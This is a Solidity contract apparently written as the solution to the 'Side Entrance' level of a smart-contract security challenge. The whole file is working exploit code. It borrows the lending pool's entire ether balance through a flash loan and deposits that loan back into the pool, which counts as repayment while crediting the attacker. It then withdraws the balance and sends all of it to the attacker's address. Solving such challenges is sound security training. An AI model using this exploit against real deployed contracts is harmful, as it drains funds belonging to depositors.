// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "../side-entrance/SideEntranceLenderPool.sol";
import "hardhat/console.sol";

contract SideAttacker is IFlashLoanEtherReceiver{

    using Address for address payable;
    uint256 poolAmount;
    SideEntranceLenderPool sideLender;

    constructor(address SideLenderAddress){
        sideLender = SideEntranceLenderPool(SideLenderAddress);
        poolAmount = address(sideLender).balance;
    }

    function flashLoan(address payable attacker) external{
        sideLender.flashLoan(poolAmount);
        sideLender.withdraw();
        (bool sent, ) = attacker.call{value: address(this).balance}("");
        require (sent, "bbb");
    }

    
    function execute() external payable override{
        sideLender.deposit{value: poolAmount}();
    }

    receive() external payable{

    }
}